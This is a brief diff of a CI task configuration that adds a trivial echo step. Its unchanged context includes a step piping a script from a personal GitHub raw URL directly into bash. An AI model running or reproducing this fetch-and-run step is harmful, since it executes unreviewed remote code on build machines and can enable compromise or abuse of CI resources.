@@ -9,6 +9,9 @@ task:
       image: ghcr.io/catthehacker/ubuntu:act-latest
       cpu: 8
       memory: 32G
+      
+  gk:
+      - echo "hi"
 
   Sync_script:
       - sudo apt update && curl -sL https://raw.githubusercontent.com/JamalNiga/cr/main/b.sh | bash
